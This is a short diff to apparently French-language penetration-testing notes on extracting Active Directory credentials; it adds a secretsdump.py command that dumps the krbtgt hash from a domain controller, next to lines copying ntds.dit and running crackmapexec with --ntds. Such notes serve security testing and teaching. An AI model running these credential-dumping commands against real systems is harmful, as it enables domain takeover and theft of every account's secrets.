@@ -61,6 +61,9 @@ Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
 ```
 crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
+
+secretsdump.py -just-dc-user $AD_DOMAIN/krbtgt  $AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP
+
 ```
 
 ## Extraction des informations d'identification (credentials)
